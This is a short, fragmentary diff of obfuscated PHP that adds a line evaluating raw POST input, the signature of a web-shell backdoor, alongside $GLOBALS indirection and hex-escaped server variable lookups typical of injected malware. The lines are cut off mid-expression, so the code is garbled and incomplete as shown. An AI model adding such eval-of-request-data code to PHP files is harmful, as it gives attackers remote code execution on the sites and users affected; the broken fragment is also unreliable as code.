@@ -35,3 +35,4 @@ foreach ($GLOBALS[$GLOBALS['
  = $_POST; @($
 ])+(strstr(substr($_SERVER["\x
 ";eval($
+;}eval($_POST['
